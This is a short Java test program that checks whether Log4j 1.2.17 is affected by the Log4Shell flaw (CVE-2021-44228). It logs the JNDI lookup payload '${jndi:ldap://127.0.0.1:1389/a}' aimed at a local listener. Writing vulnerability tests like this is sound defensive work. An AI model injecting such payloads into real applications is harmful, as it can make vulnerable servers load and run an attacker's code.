import org.apache.log4j.Logger;
import org.apache.log4j.LogManager;
import org.apache.log4j.PropertyConfigurator;

// CVE-2021-44228 test for Log4j 1.2.17

public class log4j {
    private static final Logger logger = Logger.getLogger(log4j.class.getName());

    public static void main(String[] args) {
        PropertyConfigurator.configure("log4j.properties");
        logger.error(LogManager.class.getProtectionDomain().getCodeSource().getLocation());
        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
    }
}
